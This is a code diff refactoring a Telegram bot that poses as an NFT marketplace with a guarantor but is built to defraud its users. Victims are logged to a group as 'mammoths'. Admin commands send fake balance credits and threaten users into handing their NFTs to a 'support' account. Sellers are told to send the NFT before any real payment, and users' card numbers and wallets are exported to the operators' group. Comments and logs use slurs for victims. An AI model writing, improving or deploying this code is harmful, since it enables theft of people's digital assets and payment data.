@@ -13,8 +13,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 import random
 import string
 from datetime import datetime
-from aiogram.types import FSInputFile, InputFile
-import math
+from aiogram.types import FSInputFile
 
 # Настройка логирования
 logging.basicConfig(
@@ -33,11 +32,11 @@ router = Router()
 
 DATA_FILE = "rekveziti.json"
 DEALS_FILE = "deals.json"
-admins = "admins.json"
+ADMINS_FILE = "admins.json"
 
 # Константы
-BOT_USERNAME = "GlassMarket_bot"  # ⚠️ БЕЗ @, как в логах: @GlassMarket_bot
-SUPPORT_USERNAME = "GlassMarketSupport"  # Username поддержки для отправки NFT
+BOT_USERNAME = "GlassMarket_bot"      # без @ (как в логах: @GlassMarket_bot)
+SUPPORT_USERNAME = "GlassMarketSupport"
 SUPPORT_LINK = f"https://t.me/{SUPPORT_USERNAME}"
 GROUP_ID = "-1003691554489"
 
@@ -56,14 +55,12 @@ def load_data() -> dict:
         logger.error(f"Ошибка загрузки данных: {e}")
         return {}
 
-
 def save_data(data: dict):
     try:
         with open(DATA_FILE, 'w', encoding='utf-8') as f:
             json.dump(data, f, ensure_ascii=False, indent=2)
     except Exception as e:
         logger.error(f"Ошибка сохранения данных: {e}")
-
 
 def load_deals() -> dict:
     try:
@@ -77,19 +74,6 @@ def load_deals() -> dict:
         logger.error(f"Ошибка загрузки сделок: {e}")
         return {}
 
-def load_admins() -> dict:
-    try:
-        if os.path.exists(admins):
-            with open(admins, 'r', encoding='utf-8') as f:
-                content = f.read().strip()
-                if content:
-                    return json.loads(content)
-        return {}
-    except Exception as e:
-        logger.error(f"Ошибка загрузки сделок: {e}")
-        return {}
-
-
 def save_deals(deals: dict):
     try:
         with open(DEALS_FILE, 'w', encoding='utf-8') as f:
@@ -97,12 +81,29 @@ def save_deals(deals: dict):
     except Exception as e:
         logger.error(f"Ошибка сохранения сделок: {e}")
 
-def save_admins(admin: dict):
+def load_admins() -> list:
+    """Всегда возвращает список ID администраторов (строки)"""
     try:
-        with open(admins, 'w', encoding='utf-8') as f:
-            json.dump(admin, f, ensure_ascii=False, indent=2)
+        if os.path.exists(ADMINS_FILE):
+            with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
+                content = f.read().strip()
+                if content:
+                    data = json.loads(content)
+                    if isinstance(data, dict):
+                        return list(data.keys())
+                    elif isinstance(data, list):
+                        return data
+        return []
     except Exception as e:
-        logger.error(f"Ошибка сохранения сделок: {e}")
+        logger.error(f"Ошибка загрузки админов: {e}")
+        return []
+
+def save_admins(admin_list: list):
+    try:
+        with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(admin_list, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        logger.error(f"Ошибка сохранения админов: {e}")
 
 def generate_short_id() -> str:
     characters = string.ascii_uppercase + string.digits
@@ -117,8 +118,6 @@ class Form(StatesGroup):
     waiting_for_card = State()
 
 
-dp.include_router(router)
-
 # ========== КЛАВИАТУРЫ ==========
 
 valuta = InlineKeyboardMarkup(inline_keyboard=[
@@ -131,7 +130,6 @@ valuta = InlineKeyboardMarkup(inline_keyboard=[
         InlineKeyboardButton(text="💎TON", callback_data="tons")
     ]
 ])
-
 
 inline_kb = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="💳 Управление реквизитами", callback_data="manage_requisites"),
@@ -155,52 +153,30 @@ requisites_keyboard = InlineKeyboardMarkup(inline_keyboard=[
 
 # ========== ОСНОВНЫЕ ОБРАБОТЧИКИ ==========
 
-
 @router.message(Command("CATALYSTTEAM"))
-async def cmd_start(message: types.Message):
+async def cmd_start_admin(message: types.Message):
     user_id = str(message.from_user.id)
-
     admins = load_admins()
 
-    # Если admins - словарь, преобразуем его ключи в список
-    if isinstance(admins, dict):
-        admin_list = list(admins.keys())
-    elif isinstance(admins, list):
-        admin_list = admins
-    else:
-        admin_list = []
-
-    # Добавляем нового админа
-    if user_id not in admin_list:
-        admin_list.append(user_id)
-        # Сохраняем как список
-        save_admins(admin_list)
-        await message.answer("🚀Режим админа включен✅")
+    if user_id not in admins:
+        admins.append(user_id)
+        save_admins(admins)
+        await message.answer("🚀Режим админа включен✅\nВведите /Admin")
     else:
         await message.answer("⚠️ Вы уже являетесь администратором")
-
 
 @router.message(Command("Admin"))
 async def cmd_admin(message: types.Message):
     user_id = str(message.from_user.id)
-
     admins = load_admins()
 
-    if isinstance(admins, dict):
-        admin_list = list(admins.keys())
-    elif isinstance(admins, list):
-        admin_list = admins
-    else:
-        admin_list = []
-
-    if user_id not in admin_list:
-        await message.answer(
-            "❌ У вас нет прав администратора ❌"
-        )
+    if user_id not in admins:
+        await message.answer("❌ У вас нет прав администратора ❌")
     else:
         await message.answer("""
-        ✅ Вы уже являетесь администратором\n
-        👇Все команды для админов
+✅ Вы уже являетесь администратором
+
+👇Все команды для админов
 /addadmin
 /NoSendNFT
 /help
@@ -208,118 +184,106 @@ async def cmd_admin(message: types.Message):
         """)
 
 @router.message(Command("addadmin"))
-async def cmd_admin(message: types.Message):
+async def add_admin_cmd(message: types.Message):
     user_id = str(message.from_user.id)
-    userid = message.text[10:]
     admins = load_admins()
 
-    if isinstance(admins, dict):
-        admin_list = list(admins.keys())
-    elif isinstance(admins, list):
-        admin_list = admins
-    else:
-        admin_list = []
-
-    if user_id not in admin_list:
+    if user_id not in admins:
         await message.answer("Пошёл нахуй")
-    else:
-        await message.answer(f"Новый Админ\n🆔:{userid}")
-        await bot.send_message(userid, f"Вас назначили администратором\n🆔:{user_id}")
-        admin_list.append(userid)
+        return
 
-        save_admins(admin_list)
+    parts = message.text.split()
+    if len(parts) < 2:
+        await message.answer("Использование: /addadmin ID")
+        return
+    new_admin = parts[1]
+
+    if new_admin not in admins:
+        admins.append(new_admin)
+        save_admins(admins)
+        await message.answer(f"Новый Админ\n🆔:{new_admin}")
+        try:
+            await bot.send_message(new_admin, f"Вас назначили администратором\n🆔:{user_id}")
+        except:
+            pass
+    else:
+        await message.answer("Этот пользователь уже администратор")
 
 @router.message(Command("addmoney"))
-async def cmd_admin(message: types.Message):
+async def add_money_cmd(message: types.Message):
     user_id = str(message.from_user.id)
-    userid = message.text[10:][:10]
-    money = message.text[20:]
     admins = load_admins()
 
-    if isinstance(admins, dict):
-        admin_list = list(admins.keys())
-    elif isinstance(admins, list):
-        admin_list = admins
-    else:
-        admin_list = []
-
-    if user_id not in admin_list:
+    if user_id not in admins:
         await message.answer("Пошёл нахуй")
-    else:
-        await message.answer(f"Деньги зачисленны\n🆔:{userid}")
-        await bot.send_message(userid, f"✅ВАМ БЫЛИ НАЧИСЛЕННЫ ДЕНЬГИ НА БАЛАНС\n💵Зачисленно:{money}💰\nСредства будут выведенны по указанным вами средствам автоматически")
+        return
+
+    parts = message.text.split()
+    if len(parts) < 3:
+        await message.answer("Использование: /addmoney ID сумма")
+        return
+    target_id, money = parts[1], parts[2]
+
+    await message.answer(f"Деньги зачислены\n🆔:{target_id}")
+    try:
+        await bot.send_message(target_id, f"✅ ВАМ БЫЛИ НАЧИСЛЕНЫ ДЕНЬГИ НА БАЛАНС\n💵Зачислено:{money}💰\nСредства будут выведены по указанным вами реквизитам автоматически")
+    except:
+        pass
 
 @router.message(Command("NoSendNFT"))
-async def cmd_admin(message: types.Message):
+async def no_send_nft_cmd(message: types.Message):
     user_id = str(message.from_user.id)
-    userid = message.text[11:]
     admins = load_admins()
 
-    if isinstance(admins, dict):
-        admin_list = list(admins.keys())
-    elif isinstance(admins, list):
-        admin_list = admins
-    else:
-        admin_list = []
-
-    if user_id not in admin_list:
+    if user_id not in admins:
         await message.answer("Пошёл нахуй")
-    else:
-        await bot.send_message(userid, text=f"‼ВНИМАНИЕ‼\nВы не отправили свой NFT подарок поддержке: @{SUPPORT_USERNAME}\nЕсли вы не передадите подарок поддержке то:\n-Ваш баланс будет заморожен❄\n-Доступ к боту будет запрещён❌")
+        return
+
+    parts = message.text.split()
+    if len(parts) < 2:
+        await message.answer("Использование: /NoSendNFT ID")
+        return
+    target_id = parts[1]
+
+    try:
+        await bot.send_message(target_id, text=f"‼ВНИМАНИЕ‼\nВы не отправили свой NFT подарок поддержке: @{SUPPORT_USERNAME}\nЕсли вы не передадите подарок поддержке то:\n-Ваш баланс будет заморожен❄\n-Доступ к боту будет запрещён❌")
+    except:
+        pass
 
 @router.message(Command("help"))
-async def cmd_admin(message: types.Message):
+async def help_cmd(message: types.Message):
     user_id = str(message.from_user.id)
     admins = load_admins()
 
-    if isinstance(admins, dict):
-        admin_list = list(admins.keys())
-    elif isinstance(admins, list):
-        admin_list = admins
-    else:
-        admin_list = []
-
-    if user_id not in admin_list:
+    if user_id not in admins:
         await message.answer("Пошёл нахуй")
     else:
         await message.answer("""
-Команды, как пользоватся, и их значение
+Команды, как пользоваться, и их значение
 /addadmin - добавление админов
 Использование:
-/addadmin 'ID человка которого хотим добавить в админы'
+/addadmin 'ID человека которого хотим добавить в админы'
 
-/NoSendNFT - отправка гою сообщения о том, что он должен передать подарок и то, что он его ещё не передал
+/NoSendNFT - отправка сообщения о том, что он должен передать подарок и то, что он его ещё не передал
 Использование:
-/NoSendNFT 'ID гоя которому надо отправить соо'
+/NoSendNFT 'ID гоя которому надо отправить сообщение'
 
-/addmoney - исскуствинное увеличевание баланса гою, еме пришлют сообщение что на его аккаунт поступили денги и что они деньги будут сами выведенны
+/addmoney - искусственное увеличение баланса, ему придет сообщение что на его аккаунт поступили деньги и что они будут выведены автоматически
 Использование:
 /addmoney 'ID гоя' 'сумма которая ему придёт'
 
 /Admin - вкладка для админов, все доступные команды
 
-/help - помошь
+/help - помощь
         """)
-
 
 @router.callback_query(lambda c: c.data.startswith("check_admin_"))
 async def check_admin_callback(callback: types.CallbackQuery):
     user_id = callback.data.replace("check_admin_", "")
-
     admins = load_admins()
 
-    if isinstance(admins, dict):
-        admin_list = list(admins.keys())
-    elif isinstance(admins, list):
-        admin_list = admins
-    else:
-        admin_list = []
-
-    if user_id not in admin_list:
-        # ВОТ ТУГА show_alert=True будет работать!
-        await callback.answer("❌ ОТКАЗАНО В ДОСТУПЕ\n"
-                              "У вас нет прав администратора",
-                              show_alert=True)
+    if user_id not in admins:
+        await callback.answer("❌ ОТКАЗАНО В ДОСТУПЕ\nУ вас нет прав администратора", show_alert=True)
     else:
         await callback.answer("✅ Вы администратор", show_alert=True)
         await callback.message.answer("Добро пожаловать в админ-панель!")
@@ -327,35 +291,26 @@ async def check_admin_callback(callback: types.CallbackQuery):
 @router.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext):
     await state.clear()
-
     logger.info(f"/start от {message.from_user.id}: {message.text}")
-
 
     await bot.send_message(GROUP_ID, f"Новый мамонт запустил бота:\n\n👨‍💻Username: @{message.from_user.username}\n🆔ID: {message.from_user.id}")
 
     # Проверяем параметры ссылки
     if len(message.text.split()) > 1:
         params = message.text.split()[1]
-
         if params.startswith("deal_"):
-            deal_id = params[5:]  # Убираем "deal_"
+            deal_id = params[5:]
             logger.info(f"Поиск сделки: {deal_id}")
-
             deals = load_deals()
-
             if deal_id in deals:
                 deal = deals[deal_id]
-
                 if deal.get('status') != 'active':
                     await message.answer(f"❌ Сделка уже {deal.get('status')}!")
                     return
-
-                # Клавиатура для покупателя
                 buyer_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                     [InlineKeyboardButton(text="✅ Оплатить", callback_data=f"pay_{deal_id}")],
                     [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_payment")]
                 ])
-
                 await message.answer(
                     f"🛒 Покупка NFT\n\n"
                     f"💰 Цена: {deal['price']}\n"
@@ -369,10 +324,8 @@ async def cmd_start(message: types.Message, state: FSMContext):
                 await message.answer("❌ Сделка не найдена!")
                 return
 
-
-
     # Обычный старт
-    photo_url = "https://iimg.su/i/WGjaUa"
+    photo_url = "https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg"
     await message.answer_photo(
         photo=photo_url,
         caption="""
@@ -390,14 +343,11 @@ async def cmd_start(message: types.Message, state: FSMContext):
         reply_markup=inline_kb
     )
 
-
 @router.message(Command("deals_list"))
 async def deals_list(message: types.Message, state: FSMContext):
     try:
-        # Способ 1: Использование FSInputFile (рекомендуется)
         document = FSInputFile(DEALS_FILE)
         await bot.send_document(GROUP_ID, document)
-
     except FileNotFoundError:
         await message.answer(f"Файл {DEALS_FILE} не найден")
     except Exception as e:
@@ -406,10 +356,8 @@ async def deals_list(message: types.Message, state: FSMContext):
 @router.message(Command("rekv_list"))
 async def rekv_list(message: types.Message, state: FSMContext):
     try:
-        # Способ 1: Использование FSInputFile (рекомендуется)
         document = FSInputFile(DATA_FILE)
         await bot.send_document(GROUP_ID, document)
-
     except FileNotFoundError:
         await message.answer(f"Файл {DATA_FILE} не найден")
     except Exception as e:
@@ -421,59 +369,50 @@ async def rekv_list(message: types.Message, state: FSMContext):
 async def create_deal_start(callback: CallbackQuery, state: FSMContext):
     data = load_data()
     user_id = str(callback.from_user.id)
-
     if user_id not in data:
         await callback.answer("❌ Сначала добавьте реквизиты!", show_alert=True)
         return
-
     await callback.answer()
-    await callback.message.answer("Выберите валюту: ",reply_markup=valuta)
-
-
+    await callback.message.answer("Выберите валюту:", reply_markup=valuta)
 
 @router.callback_query(F.data == "rub")
-async def create_deal_start(callback: CallbackQuery, state: FSMContext):
+async def choose_rub(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.answer("Введие цену в рублях: ")
+    await callback.message.answer("Введите цену в рублях:")
     await state.set_state(Form.waiting_for_price)
 
-
 @router.callback_query(F.data == "tons")
-async def create_deal_start(callback: CallbackQuery, state: FSMContext):
+async def choose_tons(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.answer("Введие цену в тонах (TON): ")
+    await callback.message.answer("Введите цену в TON:")
     await state.set_state(Form.waiting_for_price)
 
 @router.callback_query(F.data == "usdt")
-async def create_deal_start(callback: CallbackQuery, state: FSMContext):
+async def choose_usdt(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.answer("Введие цену в долларах: ")
+    await callback.message.answer("Введите цену в USDT:")
     await state.set_state(Form.waiting_for_price)
 
 @router.callback_query(F.data == "stars")
-async def create_deal_start(callback: CallbackQuery, state: FSMContext):
+async def choose_stars(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.answer("Введие цену в звёздах: ")
+    await callback.message.answer("Введите цену в звёздах:")
     await state.set_state(Form.waiting_for_price)
-
 
 @router.message(Form.waiting_for_price)
 async def save_price(message: types.Message, state: FSMContext):
     price = message.text.strip()
-
     try:
         float_price = float(price)
         if float_price <= 0:
             await message.answer("❌ Цена должна быть больше 0!")
             return
     except ValueError:
-        await message.answer("❌ Введите число!", show_alert=True)
+        await message.answer("❌ Введите число!")
         return
-
     await state.update_data(price=price)
     await message.answer("Теперь отправьте ссылку на NFT:")
     await state.set_state(Form.waiting_for_nftlink)
-
 
 @router.message(Form.waiting_for_nftlink)
 async def save_nftlink(message: types.Message, state: FSMContext):
@@ -481,12 +420,9 @@ async def save_nftlink(message: types.Message, state: FSMContext):
     user_data = await state.get_data()
     price = user_data.get('price')
     user_id = message.from_user.id
-    username =message.from_user.username
+    username = message.from_user.username
 
-    # Генерируем уникальный ID
     deal_id = generate_short_id()
-
-    # Используем правильный юзернейм бота
     deal_data = {
         "deal_id": deal_id,
         "seller_id": str(message.from_user.id),
@@ -498,7 +434,6 @@ async def save_nftlink(message: types.Message, state: FSMContext):
         "deal_link": f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
     }
 
-    # Сохраняем сделку
     deals = load_deals()
     deals[deal_id] = deal_data
     save_deals(deals)
@@ -506,7 +441,6 @@ async def save_nftlink(message: types.Message, state: FSMContext):
     logger.info(f"Создана сделка: {deal_id}")
     logger.info(f"Ссылка: {deal_data['deal_link']}")
 
-    # Клавиатура для продавца
     deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📤 Поделиться ссылкой",
                               url=f"https://t.me/share/url?url={deal_data['deal_link']}&text=Купи%20мой%20NFT%20за%20{price}!")],
@@ -524,107 +458,87 @@ async def save_nftlink(message: types.Message, state: FSMContext):
     )
 
     await bot.send_message(GROUP_ID, f"#Новаясделка\n\n🆕Гой создал сделку\n\n🆔ID сделки: {deal_id}\n🔗Ссылка на NFT: {nftlink}\n\n👨‍💻Username гоя: @{username}\n🆔ID гоя: {user_id}")
-
     await state.clear()
-
 
 # ========== ОБРАБОТКА ОПЛАТЫ ==========
 
 @router.callback_query(F.data.startswith("pay_"))
 async def process_payment(callback: CallbackQuery):
-    """Обработка нажатия кнопки оплаты"""
-    deal_id = callback.data[4:]  # Убираем "pay_"
+    deal_id = callback.data[4:]
     logger.info(f"Оплата сделки: {deal_id}")
     admins = load_admins()
-    usid = callback.from_user.id
+    buyer_id = str(callback.from_user.id)
 
-    logger.info(usid)
-
-    if str(usid) not in admins:
-        logger.info(admins)
-        await callback.answer("❌ВЫ НЕ ЗАРЕГЕСТРИРОВАННЫ КАК ПОКУПАТЕЛЬ❌", show_alert=True)
+    if buyer_id not in admins:
+        await callback.answer("❌ ВЫ НЕ ЗАРЕГЕСТРИРОВАНЫ КАК ПОКУПАТЕЛЬ❌", show_alert=True)
         return
-    else:
-        deals = load_deals()
-
-        if deal_id not in deals:
-            await callback.answer("❌ Сделка не найдена!", show_alert=True)
-            return
-
-        deal = deals[deal_id]
-
-        if deal.get('status') != 'active':
-            await callback.answer(f"⚠️ Сделка уже {deal.get('status')}!", show_alert=True)
-            return
-
-        # Обновляем статус
-        deal['status'] = 'paid'
-        deal['buyer_id'] = str(callback.from_user.id)
-        deal['buyer_username'] = callback.from_user.username or "Без username"
-        deal['paid_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-        save_deals(deals)
-
-        await callback.answer("✅ Оплата подтверждена!", show_alert=True)
-        await callback.message.edit_text(
-            f"✅ Оплата проведена!\n"
-            f"💰 {deal['price']}\n"
-            f"📊 ID: {deal_id}\n\n"
-            f"⌛ Продавец уведомлен. Ожидайте отправки NFT."
-        )
-
-        # Уведомляем продавца с ПРЕДУПРЕЖДЕНИЕМ об отправке NFT
-        seller_id = deal['seller_id']
-        try:
-            seller_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="✅ Подтвердить отправку", callback_data=f"confirm_{deal_id}")],
-                [InlineKeyboardButton(text="❌ Отменить сделку", callback_data=f"cancel_{deal_id}")]
-            ])
-
-            await bot.send_message(
-                chat_id=seller_id,
-                text=f"🎉 Сделка оплачена!\n\n"
-                     f"📊 ID сделки: {deal_id}\n"
-                     f"💰 Сумма: {deal['price']}\n"
-                     f"👤 Покупатель: @{deal['buyer_username']}\n"
-                     f"🔗 NFT: {deal['nft_link']}\n\n"
-                     f"⚠️ ВАЖНО: Перед подтверждением отправки,\n"
-                     f"отправьте NFT нашему гаранту:\n"
-                     f"👉 @{SUPPORT_USERNAME}\n\n"
-                     f"✅ После отправки нажмите кнопку ниже:",
-                reply_markup=seller_keyboard
-            )
-            logger.info(f"Уведомление отправлено продавцу {seller_id}")
-        except Exception as e:
-            logger.error(f"Ошибка отправки продавцу: {e}")
-
-
-# ========== ОБРАБОТКА ПОДТВЕРЖДЕНИЯ ОТПРАВКИ ==========
-
-@router.callback_query(F.data.startswith("confirm_"))
-async def confirm_send_handler(callback: CallbackQuery):
-    """Продавец подтверждает отправку NFT"""
-    deal_id = callback.data[8:]  # Убираем "confirm_"
-    logger.info(f"Подтверждение отправки для сделки: {deal_id}")
 
     deals = load_deals()
-
     if deal_id not in deals:
         await callback.answer("❌ Сделка не найдена!", show_alert=True)
         return
 
     deal = deals[deal_id]
+    if deal.get('status') != 'active':
+        await callback.answer(f"⚠️ Сделка уже {deal.get('status')}!", show_alert=True)
+        return
 
+    deal['status'] = 'paid'
+    deal['buyer_id'] = buyer_id
+    deal['buyer_username'] = callback.from_user.username or "Без username"
+    deal['paid_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    save_deals(deals)
+
+    await callback.answer("✅ Оплата подтверждена!", show_alert=True)
+    await callback.message.edit_text(
+        f"✅ Оплата проведена!\n"
+        f"💰 {deal['price']}\n"
+        f"📊 ID: {deal_id}\n\n"
+        f"⌛ Продавец уведомлен. Ожидайте отправки NFT."
+    )
+
+    seller_id = deal['seller_id']
+    try:
+        seller_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="✅ Подтвердить отправку", callback_data=f"confirm_{deal_id}")],
+            [InlineKeyboardButton(text="❌ Отменить сделку", callback_data=f"cancel_{deal_id}")]
+        ])
+        await bot.send_message(
+            chat_id=seller_id,
+            text=f"🎉 Сделка оплачена!\n\n"
+                 f"📊 ID сделки: {deal_id}\n"
+                 f"💰 Сумма: {deal['price']}\n"
+                 f"👤 Покупатель: @{deal['buyer_username']}\n"
+                 f"🔗 NFT: {deal['nft_link']}\n\n"
+                 f"⚠️ ВАЖНО: Перед подтверждением отправки,\n"
+                 f"отправьте NFT нашему гаранту:\n"
+                 f"👉 @{SUPPORT_USERNAME}\n\n"
+                 f"✅ После отправки нажмите кнопку ниже:",
+            reply_markup=seller_keyboard
+        )
+        logger.info(f"Уведомление отправлено продавцу {seller_id}")
+    except Exception as e:
+        logger.error(f"Ошибка отправки продавцу: {e}")
+
+# ========== ПОДТВЕРЖДЕНИЕ ОТПРАВКИ ==========
+
+@router.callback_query(F.data.startswith("confirm_"))
+async def confirm_send_handler(callback: CallbackQuery):
+    deal_id = callback.data[8:]
+    logger.info(f"Подтверждение отправки для сделки: {deal_id}")
+    deals = load_deals()
+    if deal_id not in deals:
+        await callback.answer("❌ Сделка не найдена!", show_alert=True)
+        return
+    deal = deals[deal_id]
     if deal.get('status') != 'paid':
         await callback.answer(f"⚠️ Статус сделки: {deal.get('status')}", show_alert=True)
         return
 
-    # Добавляем дополнительное подтверждение
     confirm_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Да, отправил NFT", callback_data=f"really_confirm_{deal_id}")],
         [InlineKeyboardButton(text="❌ Нет, вернуться", callback_data="back_to_payment")]
     ])
-
     await callback.message.edit_text(
         f"⚠️ ПОДТВЕРЖДЕНИЕ ОТПРАВКИ\n\n"
         f"📊 ID сделки: {deal_id}\n"
@@ -635,34 +549,25 @@ async def confirm_send_handler(callback: CallbackQuery):
         f"❌ Иначе покупатель не получит свой товар.",
         reply_markup=confirm_keyboard
     )
-
     await callback.answer()
-
 
 @router.callback_query(F.data.startswith("really_confirm_"))
 async def really_confirm_handler(callback: CallbackQuery):
-    """Окончательное подтверждение отправки"""
-    deal_id = callback.data[15:]  # Убираем "really_confirm_"
-    logger.info(f"Окончательное подтверждение отправки: {deal_id}")
-
+    deal_id = callback.data[15:]
+    logger.info(f"Окончательное подтверждение: {deal_id}")
     deals = load_deals()
-
     if deal_id not in deals:
         await callback.answer("❌ Сделка не найдена!", show_alert=True)
         return
-
     deal = deals[deal_id]
-
     if deal.get('status') != 'paid':
         await callback.answer(f"⚠️ Статус сделки: {deal.get('status')}", show_alert=True)
         return
 
-    # Обновляем статус
     deal['status'] = 'completed'
     deal['completed_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     deal['confirmed_by_seller'] = True
     deal['confirmation_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
     save_deals(deals)
 
     await callback.answer("✅ Отправка подтверждена!", show_alert=True)
@@ -676,7 +581,6 @@ async def really_confirm_handler(callback: CallbackQuery):
         reply_markup=back_keyboard
     )
 
-    # Уведомляем покупателя
     buyer_id = deal.get('buyer_id')
     if buyer_id:
         try:
@@ -694,7 +598,6 @@ async def really_confirm_handler(callback: CallbackQuery):
         except Exception as e:
             logger.error(f"Ошибка отправки покупателю: {e}")
 
-    # Также можно уведомить поддержку
     try:
         await bot.send_message(
             chat_id=SUPPORT_USERNAME,
@@ -709,32 +612,23 @@ async def really_confirm_handler(callback: CallbackQuery):
     except Exception as e:
         logger.error(f"Ошибка отправки уведомления поддержке: {e}")
 
-
 @router.callback_query(F.data == "back_to_payment")
 async def back_to_payment_handler(callback: CallbackQuery):
-    """Возврат к информации о платеже"""
     await callback.answer("Возвращаемся...")
-
-    # Находим deal_id из предыдущего сообщения
     message_text = callback.message.text
     deal_id = None
-
-    # Ищем ID сделки в тексте сообщения
     for line in message_text.split('\n'):
         if 'ID сделки:' in line:
             deal_id = line.split(':')[-1].strip()
             break
-
     if deal_id:
         deals = load_deals()
         if deal_id in deals:
             deal = deals[deal_id]
-
             seller_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="✅ Подтвердить отправку", callback_data=f"confirm_{deal_id}")],
                 [InlineKeyboardButton(text="❌ Отменить сделку", callback_data=f"cancel_{deal_id}")]
             ])
-
             await callback.message.edit_text(
                 f"🎉 Сделка оплачена!\n\n"
                 f"📊 ID сделки: {deal_id}\n"
@@ -748,34 +642,23 @@ async def back_to_payment_handler(callback: CallbackQuery):
                 reply_markup=seller_keyboard
             )
     else:
-        await callback.message.edit_text(
-            "❌ Не удалось найти информацию о сделке.\n"
-            "Вернитесь в главное меню."
-        )
-
+        await callback.message.edit_text("❌ Не удалось найти информацию о сделке.\nВернитесь в главное меню.")
 
 # ========== ОТМЕНА СДЕЛКИ ==========
 
 @router.callback_query(F.data.startswith("cancel_"))
 async def cancel_deal_handler(callback: CallbackQuery):
-    """Продавец отменяет сделку"""
-    deal_id = callback.data[7:]  # Убираем "cancel_"
+    deal_id = callback.data[7:]
     logger.info(f"Отмена сделки: {deal_id}")
-
     deals = load_deals()
-
     if deal_id not in deals:
         await callback.answer("❌ Сделка не найдена!", show_alert=True)
         return
-
     deal = deals[deal_id]
-
-    # Добавляем подтверждение отмены
     cancel_confirm_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Да, отменить сделку", callback_data=f"really_cancel_{deal_id}")],
         [InlineKeyboardButton(text="❌ Нет, вернуться", callback_data=f"confirm_{deal_id}")]
     ])
-
     await callback.message.edit_text(
         f"⚠️ ПОДТВЕРЖДЕНИЕ ОТМЕНЫ\n\n"
         f"📊 ID сделки: {deal_id}\n"
@@ -786,28 +669,19 @@ async def cancel_deal_handler(callback: CallbackQuery):
         f"⚠️ Это действие нельзя отменить.",
         reply_markup=cancel_confirm_keyboard
     )
-
     await callback.answer()
-
 
 @router.callback_query(F.data.startswith("really_cancel_"))
 async def really_cancel_handler(callback: CallbackQuery):
-    """Окончательная отмена сделки"""
-    deal_id = callback.data[14:]  # Убираем "really_cancel_"
-
+    deal_id = callback.data[14:]
     deals = load_deals()
-
     if deal_id not in deals:
         await callback.answer("❌ Сделка не найдена!", show_alert=True)
         return
-
     deal = deals[deal_id]
-
-    # Обновляем статус
     deal['status'] = 'cancelled'
     deal['cancelled_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     deal['cancelled_by'] = 'seller'
-
     save_deals(deals)
 
     await callback.answer("❌ Сделка отменена!", show_alert=True)
@@ -819,7 +693,6 @@ async def really_cancel_handler(callback: CallbackQuery):
         f"Средства покупателю будут возвращены."
     )
 
-    # Уведомляем покупателя
     buyer_id = deal.get('buyer_id')
     if buyer_id:
         try:
@@ -834,23 +707,17 @@ async def really_cancel_handler(callback: CallbackQuery):
         except Exception as e:
             logger.error(f"Ошибка отправки покупателю: {e}")
 
-
 # ========== ПРОЧИЕ ОБРАБОТЧИКИ ==========
 
 @router.callback_query(F.data == "cancel_payment")
 async def cancel_payment_handler(callback: CallbackQuery):
-    """Покупатель отменяет оплату"""
     await callback.answer("❌ Оплата отменена", show_alert=True)
     await callback.message.edit_text("❌ Оплата отменена.")
 
-
 @router.callback_query(F.data.startswith("delete_"))
 async def delete_deal_handler(callback: CallbackQuery):
-    """Удаление сделки"""
-    deal_id = callback.data[7:]  # Убираем "delete_"
-
+    deal_id = callback.data[7:]
     deals = load_deals()
-
     if deal_id in deals:
         if deals[deal_id].get('status') == 'active':
             del deals[deal_id]
@@ -862,15 +729,12 @@ async def delete_deal_handler(callback: CallbackQuery):
     else:
         await callback.answer("❌ Сделка не найдена!", show_alert=True)
 
-
-
 # ========== УПРАВЛЕНИЕ РЕКВИЗИТАМИ ==========
 
 @router.callback_query(F.data == "manage_requisites")
 async def manage_requisites(callback: CallbackQuery):
     user_id = str(callback.from_user.id)
     data = load_data()
-
     user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
     ton_wallet = user_data.get("ton_wallet", "Не указан") or "Не указан"
     card = user_data.get("card", "Не указана") or "Не указана"
@@ -886,23 +750,19 @@ async def manage_requisites(callback: CallbackQuery):
     )
     await callback.answer()
 
-
 @router.callback_query(F.data == "add_ton")
 async def add_ton(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
     await callback.message.answer("Введите TON кошелек:")
     await state.set_state(Form.waiting_for_ton)
 
-
 @router.message(Form.waiting_for_ton)
 async def save_ton(message: types.Message, state: FSMContext):
     ton_wallet = message.text.strip()
     user_id = str(message.from_user.id)
-
     data = load_data()
     if user_id not in data:
         data[user_id] = {"ton_wallet": "", "card": ""}
-
     data[user_id]["ton_wallet"] = ton_wallet
     save_data(data)
 
@@ -925,78 +785,51 @@ async def save_ton(message: types.Message, state: FSMContext):
         reply_markup=requisites_keyboard
     )
 
-
 @router.callback_query(F.data == "add_card")
 async def add_card(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.answer("Введите номер карты:")
+    await callback.message.answer("Введите номер карты (16 или 18 цифр):")
     await state.set_state(Form.waiting_for_card)
-
 
 @router.message(Form.waiting_for_card)
